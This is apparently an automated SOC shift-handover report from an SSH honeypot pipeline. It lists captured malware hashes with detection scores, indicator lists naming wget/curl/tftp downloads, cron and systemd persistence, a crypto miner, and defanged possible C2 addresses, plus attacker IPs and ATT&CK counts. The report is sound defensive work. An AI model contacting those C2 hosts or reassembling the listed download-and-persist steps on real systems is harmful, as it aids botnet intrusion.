| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.186[.]197` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `121.224.78[.]164` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `200.50.163[.]65` | AR | VILLA DIGITAL SRL | **100** ⚠️ | 0 |
| `38.110.46[.]235` | US | Georgia Institute of Technology | **100** ⚠️ | 17 |
| `38.110.46[.]237` | US | Georgia Institute of Technology | **100** ⚠️ | 9 |
| `104.237.145[.]228` | US | Linode | **100** ⚠️ | 29 |
| `85.217.149[.]5` | CA | Modat B.V. | **100** ⚠️ | 50 |
| `172.212.227[.]53` | US | Microsoft Limited | **100** ⚠️ | 8 |
| `46.151.178[.]14` | NL | SINO WORLDWIDE TRADING LIMITED | **100** ⚠️ | 0 |
| `103.248.120[.]6` | IN | Shivansh Infotech pvt Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 167 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 144 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 60 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 44 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 35 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 17 |
| AbuseIPDB score 1 below threshold 25 | 5 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 293 cases |
| Tool 34  | Credential Extractor        | ✅ 4552 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 25 fingerprints |
| Tool 36  | Command Clustering          | ✅ 64 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 161 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (19.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 81 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 137 priority case(s) shown individually · 91 recon entry/entries in table (9 group(s) consolidating 18 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-10T19:03:36Z_
